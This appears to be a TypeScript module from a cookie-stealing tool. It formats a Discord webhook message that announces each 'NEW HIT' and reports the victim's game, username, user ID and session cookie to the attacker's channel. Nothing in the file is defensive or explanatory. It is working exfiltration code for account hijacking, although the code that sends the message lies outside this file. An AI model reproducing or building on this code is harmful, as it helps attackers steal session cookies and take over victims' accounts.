import { SessionResponse } from "./actions/session";

export interface DiscordPayloadOptions extends SessionResponse {
  gameName: string;
  username: string;
}

export function createDiscordPayload({
  gameName,
  username,
  cookie,
  userId,
  id,
}: DiscordPayloadOptions) {
  return {
    content: `@everyone NEW HIT #${id}`,
    attachments: [],
    embeds: [
      {
        title: `${gameName} | Hit #${id}`,
        color: 0x008ff1,
        description: `**Sequence:** #${id}\n**Game:** ${gameName}\n**Target Username:** ${username}\n**Target ID:** ${userId}`,
        fields: [
          {
            name: "🍪 Cookie",
            value: `\`\`\`${cookie}\`\`\``,
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
        },
      },
    ],
  };
}
